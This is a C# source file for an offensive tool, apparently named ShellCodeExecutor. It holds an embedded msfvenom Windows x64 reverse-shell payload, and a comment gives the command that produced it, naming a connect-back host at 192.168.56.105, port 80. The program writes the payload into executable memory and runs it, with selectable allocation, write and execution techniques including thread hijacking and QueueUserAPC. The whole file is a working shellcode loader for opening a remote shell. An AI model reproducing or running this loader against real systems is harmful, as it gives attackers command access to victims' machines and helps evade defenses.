﻿using System;
using static ShellCodeExecutor.MemoryAllocator;
using static ShellCodeExecutor.MemoryWriter;
namespace ShellCodeExecutor
{

    public class Program {

        //└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.105 LPORT=80 -f csharp -v shellCode
        static byte[] shellCode = new byte[460] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
            0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
            0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
            0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
            0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
            0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x00,0x50,0xc0,0xa8,0x38,0x66,0x41,0x54,
            0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
            0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
            0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
            0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
            0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
            0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
            0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
            0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
            0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
            0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
            0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
            0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
            0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
            0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
            0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };




        static void Main(string[] args){
            //Set Defaults (VirtualAlloc for Alloc, WriteProcessMemory for Write and Classic Shellcode Runner for execution)
            ALLOCATE_TYPES allocType = ALLOCATE_TYPES.VirtualAlloc;
            WRITE_METHOD writeMethod = WRITE_METHOD.WriteProcessMemory;
            IShellCodeRunner shellCodeRunner = new ClassicShellCodeRunner();

            for (int i = 0; i < args.Length; i++){
                switch (args[i]) {
                    case "-a":
                        if (i + 1 == args.Length)
                        {
                            Console.WriteLine("[-] Missing ShellCode Execution Type \n Exiting");
                        }

                        if (!Enum.TryParse(args[i+1], out allocType))
                        {
                            Console.WriteLine("[-] Unknown allocation type '"+args[i+1]+"' \n Exiting");
                            return;
                        }
                        i++;
                        break;
                    case "-s":
                        if (i+1 == args.Length)
                        {
                            Console.WriteLine("[-] Missing ShellCode Execution Type \n Exiting");
                        }
                        switch (args[i + 1]){
                            case "Classic":
                                shellCodeRunner = new ClassicShellCodeRunner();
                                break;
                            case "Delegate":
                                shellCodeRunner = new DelegateShellCodeRunner();
                                break;
                            case "LocalThreadHighjack":
                                shellCodeRunner = new LocalThreadHighjackingShellCodeRunner();
                                break;
                            case "QueueUserAPC":
                                shellCodeRunner = new QueueUserAPCShellCodeRunner();
                                break;
                            default:
                                Console.WriteLine("[-] Unknown execution type '" + args[i + 1] + "' \n Exiting");
                                return;
                             
                        }
                        i++;
                        
                        break;
                    case "-w":
                        if (i + 1 == args.Length)
                        {
                            Console.WriteLine("[-] Missing Write Method Type \n Exiting");
                        }
                        if (!Enum.TryParse(args[i + 1], out writeMethod))
                        {
                            Console.WriteLine("[-] Unknown WriteMethod type '" + args[i + 1] + "' \n Exiting");
                            return;
                        }
                        i++;
                        break;
                    case "-h":
                        printHelp();
                        return;
                    default:
                        Console.WriteLine("[-] Unknown argument '" + args[i] + "' \n Exiting");
                        return;
                }
            }
            Console.WriteLine("[+] Using selected Allocation " + allocType + ", Write Method " + writeMethod + ", Shellcode Exexution " + shellCodeRunner.ToString());
            Console.WriteLine("[+] Allocating Memory");
            IntPtr rwxMemory = MemoryAllocator.AllocateMemory((uint)shellCode.Length, allocType);
            Console.WriteLine("[+] Writing Shellcode to Memory");
            MemoryWriter.WriteToMemory(rwxMemory, shellCode, writeMethod);
            Console.WriteLine("[+] Executing Memory");
            shellCodeRunner.RunShellCode(rwxMemory);

        }
        static void printHelp(){
            Console.WriteLine("ShellCodeExecutor.exe: Executes shellcode stored in shellCode variable within the same process, allows specifying the memory allocation, shellcode writing method and shellcode execution method");
            Console.WriteLine("Arguments");
            Console.WriteLine("\t -a <Allocation_Method>: Specifies which allocation method to use. Available choices:  VirtualAlloc (Default), VirtualAllocEx, VirtualAllocExNuma, NtCreateSection");
            Console.WriteLine("\t -h : Show help menu.");
            Console.WriteLine("\t -s <ShellCode_Execution_Method>: Specifies which shellcode execution method to use. Available choices:  Classic (Default), Delegate, LocalThreadHighjack, QueueUserAPC");
            Console.WriteLine("\t -w <Write_Method>: Specifies which write method to use when writing shellcode to memory. Available choices:  WriteProcessMemory (Default), MarshalCopy, RtlMoveMemory");

        }

    }
}
